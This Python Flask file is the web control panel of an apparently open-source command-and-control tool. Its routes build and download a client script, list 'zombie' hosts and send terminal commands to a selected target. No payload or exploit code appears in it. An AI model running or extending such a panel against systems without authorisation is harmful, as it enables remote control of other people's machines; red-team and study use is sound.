#!/usr/bin/env python3

'''
This script will be run when --web argument is set instead of gui window
'''

from flask import request, redirect, render_template
import logging
from time import sleep
from threading import Thread
from modules.get_modules import get_config_value
from web_interface.functions.flask_with_new_banner import FlaskWithNewBanner
from modules.logger import Logger
from modules.server import ServerModule

# if you start the server for first time cookies will be cleared
UseSSL = None

# (global variables) for communicating between program parts
serverModuleVar = None
connectionStatusVar = None
serverLogger = Logger(file_name='server')

def main_web_start(
        use_ssl
):
    UseSSL = use_ssl
    template_folder_path ='web_interface/templates/'
    static_folder_path = 'web_interface/static/'
    app_main = FlaskWithNewBanner('__main__' ,template_folder=template_folder_path ,static_folder=static_folder_path)

    # set upload dir
    UPLOAD_FOLDER = './'
    app_main.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

    # disable flask url logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app_main.route('/')
    def index():
        from web_interface.functions.index import index
        index = index()
        return index

    @app_main.route('/login')
    def login():
        from web_interface.functions.login import login
        if (request.args.get('error')):
            login = login(error=request.args.get('error'))
        else:
            login = login()

        return login

    @app_main.route('/check_login' ,methods=['POST'])
    def check_login():
        from web_interface.functions.check_login import CheckLogin
        if request.method == 'POST':
            check = CheckLogin(user=request.form['user'] ,user_pass=request.form['passw'])
            ret = check.run()
            return ret

    @app_main.route('/dashboard')
    def dashboard():
        from web_interface.functions.dashboard import Dashboard
        dashboard = Dashboard()
        dashboard_ret = dashboard.run()
        return dashboard_ret

    @app_main.route('/server')
    def server_url():
        from web_interface.functions.server_web import ServerWebPage
        server_web_page = ServerWebPage()
        server_ret = server_web_page.run()
        return server_ret

    @app_main.route('/server_conf_check', methods=['GET'])
    def server_conf_check_url():
        from web_interface.functions.server_web import server_conn_check_func
        return server_conn_check_func(serverModuleVar)

    # Find the last line of the server.txt file
    with open('logs/server.txt', 'r') as file_server:
        global index_last_log_server
        index_last_log_server = len(file_server.readlines())

    def stream_server_file():
        # Read server.txt file and return lines
        global index_last_log_server
        while True:
            with open('logs/server.txt', 'r') as server_txt_file:
                try:
                    yield server_txt_file.readlines()[index_last_log_server] + '<br>'
                    index_last_log_server += 1
                    sleep(0.2)  # delay to show log in template
                except Exception:
                    continue

    @app_main.route('/server_conf_stop', methods=['POST'])
    def server_conf_stop_url():
        from web_interface.functions.server_web import server_conf_stop_url_func
        global serverModuleVar
        return server_conf_stop_url_func(server_module_var=serverModuleVar, server_logger_var=serverLogger)

    def server_conf_start_set_server_module(lip, lport):
        global serverModuleVar
        if ((serverModuleVar is None) or (not serverModuleVar.connection_status)):
            serverModuleVar = ServerModule(lip=lip, lport=lport)
            serverModuleVar.start_server()

    @app_main.route('/server_conf_start', methods=['POST'])
    def server_conf_start_url():
        from web_interface.functions.server_web import server_conf_start_url_func
        return server_conf_start_url_func(set_server_module_var_func=server_conf_start_set_server_module)

    @app_main.route('/server_conf', methods=['GET'])
    def server_conf_url():
        from web_interface.functions.server_web import server_conf_url_func
        return server_conf_url_func(streamer_function=stream_server_file)

    # Find the last line of the create_script file
    with open('logs/create_script.txt', 'r') as file_create_script:
        global index_last_log_create_script
        index_last_log_create_script = len(file_create_script.readlines())

    def stream_create_script_file():
        # Read create_script file and return lines
        global index_last_log_create_script
        while True:
            with open('logs/create_script.txt', 'r') as create_script_file:
                try:
                    yield create_script_file.readlines()[index_last_log_create_script] + '<br>'
                    index_last_log_create_script += 1
                    sleep(0.2)  # delay to show log in template
                except Exception:
                    continue

    @app_main.route('/create_script_conf', methods=['GET'])
    def create_script_conf():
        from web_interface.functions.create_script_web import create_script_conf_func
        return create_script_conf_func(streamer_function=stream_create_script_file)

    @app_main.route('/create_script_conf_create', methods=['POST'])
    def create_script_create_url():
        from web_interface.functions.create_script_web import create_script_create_url_func
        return create_script_create_url_func()

    @app_main.route('/create_script')
    def create_script_url():
        from web_interface.functions.create_script_web import CreateScriptWeb
        create_script_web_ret = CreateScriptWeb().run()
        return create_script_web_ret

    @app_main.route('/download_script')
    def download_script_url():
        from web_interface.functions.create_script_web import download_script_url_func
        return download_script_url_func(app_main)

    @app_main.route('/zombies')
    def zombies_url():
        from web_interface.functions.zombies_web import ZombiesWeb
        zombies_web_ret = ZombiesWeb().run()
        return zombies_web_ret

    @app_main.route('/get_zombies', methods=['GET'])
    def get_zombies_url():
        from web_interface.functions.zombies_web import get_zombies_url_func
        return get_zombies_url_func(serverModuleVar)

    @app_main.route('/terminal')
    def terminal_url():
        from web_interface.functions.terminal_web import TerminalWeb
        terminal_web_ret = TerminalWeb().run()
        return terminal_web_ret

    with open('logs/terminal.txt', 'r') as file_terminal:
        global index_last_log_terminal
        index_last_log_terminal = len(file_terminal.readlines())

    def stream_terminal_file():
        # Read terminal file and return lines
        global index_last_log_terminal
        while True:
            with open('logs/terminal.txt', 'r') as terminal_txt_file:
                try:
                    yield terminal_txt_file.readlines()[index_last_log_terminal] + '<br>'
                    index_last_log_terminal += 1
                    sleep(0.2)  # delay to show log in template
                except Exception:
                    continue

    @app_main.route('/send_terminal_cmd', methods=['POST'])
    def send_terminal_cmd_url():
        from web_interface.functions.terminal_web import send_terminal_cmd_func
        global serverModuleVar
        return send_terminal_cmd_func(server_module_var=serverModuleVar)

    @app_main.route('/terminal_get_output', methods=['GET'])
    def terminal_get_output_url():
        from web_interface.functions.terminal_web import terminal_get_output_url_func
        return terminal_get_output_url_func(streamer_function=stream_terminal_file)

    @app_main.route('/terminal_get_default_target', methods=['GET'])
    def terminal_get_default_target_url():
        from web_interface.functions.terminal_web import terminal_get_default_target_func
        return terminal_get_default_target_func(server_module_var=serverModuleVar)

    @app_main.route('/logout')
    def logout():
        from web_interface.functions.logout import logout
        return logout()

    @app_main.route('/forgotpass')
    def forgot_password():
        return redirect('https://github.com/nxenon/c2x-http/blob/master/docs/forgotpass.md' ,code=302)

    @app_main.route('/docs')
    def docs():
        from web_interface.functions.docs import docs
        return docs()

    @app_main.errorhandler(404)
    def page_not_found(e):
        return render_template('404_error.html'), 404

    @app_main.errorhandler(500)
    def internal_error(e):
        msg = '''
        <h1 style="text-align:center">Internal Server Error (500)</h1>
        <br>
        <h2 style="text-align:center">This might be for bad arguments or bad configuration</h2>
        <br>
        <h2 style="text-align:center">You can restart the script</h2>
        '''
        return msg ,500

    @app_main.after_request
    def add_header(response):
        response.headers['Cache-Control'] = 'no-cache'  # tell browser not to cache contents
        return response

    def print_url_banner():
        sleep(0.1)
        flask_url_msg = '\n\tWeb interface running on http://' + str(listening_ip) + ':' + str(listening_port) + '/'
        if UseSSL:
            flask_url_msg = flask_url_msg.replace('http', 'https')
        print(flask_url_msg)
        print()

    listening_ip = get_config_value(main_key='web_listen_ip')
    listening_port = get_config_value(main_key='web_listen_port')

    Thread(target=print_url_banner).start()  # start a thread to print http url after flask headers
    ssl_context = None
    if UseSSL:
        ssl_context = 'adhoc'
    app_main.run(port=listening_port, host=listening_ip, ssl_context=ssl_context)